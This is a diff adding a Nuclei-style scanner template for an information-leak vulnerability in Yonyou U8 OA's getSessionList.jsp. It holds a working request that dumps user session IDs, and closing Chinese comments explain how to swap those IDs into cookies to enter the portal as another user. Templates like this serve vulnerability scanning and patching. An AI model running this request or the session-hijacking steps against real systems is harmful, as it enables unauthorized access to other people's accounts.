@@ -1,0 +1,30 @@
+id: yongyouOA-U8-getSessionList_jsp-info-leak
+
+info:
+  name: 用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞
+  author: cnaq
+  severity: medium  
+  description: 用友 U8 OA getSessionList.jsp文件，通过漏洞攻击者可以获取数据库中管理员的账户信息
+  reference: 
+    - http://wiki.peiqi.tech/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20U8%20OA%20getSessionList.jsp%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.html
+  tags: yongyouOA,getSession,leak,info
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "index.jsp"
+        part: body
+        negative: true
+
+# 获取到所有用户的SessionID之后访问：/yyoa/common/js/menu/menu.jsp，替换Cookie
+# 再访问yyoa/portal/portalIndex.jsp进入首页
